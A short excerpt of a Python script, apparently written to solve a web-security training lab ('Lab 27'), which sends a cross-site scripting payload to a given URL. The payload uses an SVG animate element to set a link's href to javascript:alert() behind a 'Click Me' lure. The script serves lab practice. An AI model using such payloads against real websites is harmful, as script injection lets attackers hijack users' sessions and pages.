...
def xss_test(url, use_proxy=False):
    try:
        ...
        payload = '<svg> <a> <animate attributeName=href values=javascript:alert() /> <text x=30 y=30 > Click Me </text> </a> </svg>'
...
def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 27')
